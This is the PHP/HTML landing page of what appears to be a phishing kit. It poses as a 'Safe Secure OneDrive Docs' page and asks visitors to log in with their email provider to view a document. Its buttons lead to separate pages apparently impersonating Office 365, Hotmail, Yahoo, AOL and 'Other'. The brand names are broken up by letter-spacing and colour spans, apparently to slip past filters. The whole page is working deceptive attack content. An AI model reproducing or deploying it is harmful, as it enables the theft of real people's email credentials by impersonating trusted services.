<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
?>
<!DOCTYPE html>
<html lang="en" style="height: 100%;">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">

    <title>Safe Secure O n e D r i v e D o c s</title>
</head>
<body style="height: 100%;background: url(assets/files/bg.jpg) no-repeat center center fixed; -webkit-background-size: cover;-moz-background-size: cover;-o-background-size: cover;background-size: cover;">
<div style=" padding-top: 50px; color: white;float: left; width: 250px; background-color: #232323; height: 100%;" class="text-center">
    <img style="width: 200px; height: auto;" src="assets/files/logo.png" alt=""><br /><br />
    <br />
<h4 class="text-center" style="text-align: center;"><span style="font-family: calibri, sans-serif; font-size: 18pt;"><strong>Login &nbsp;with your provider email </strong><strong> to view Document</strong></span></h4>
    <br />

    <a href="GbeseOffic.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info"><span style="font-size: 13pt;"><strong><span style="font-family: calibri, sans-serif;"><span style="color: #ffffff;">Off</span>ice 3<span style="color: #f2f0f0;">65</span></span></strong></span></a> <br />
    <a href="GbeseHot.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info"><span style="font-size: 13pt;"><strong><span style="font-family: calibri, sans-serif;">H<span style="color: #fffcfc;">otm</span>ail</span></strong></span></a><br />
    <a href="GbeseYaho.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info"><span style="font-size: 13pt;"><strong><span style="font-family: calibri, sans-serif;">Y<span style="color: #fffcfc;">ah</span>oo</span></strong></span></a><br />
    <a href="Gbeseol.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info"><span style="font-size: 13pt;"><strong><span style="font-family: calibri, sans-serif;">A<span style="color: #fffcfc;">O</span>L</span></strong></span></a><br />
    <a href="GbeseOr.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info"><span style="font-size: 13pt;"><strong><span style="font-family: calibri, sans-serif;">Ot<span style="color: #fffcfc;">her</span></span></strong></span></a><br />

</div>

<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
</body>
</html>
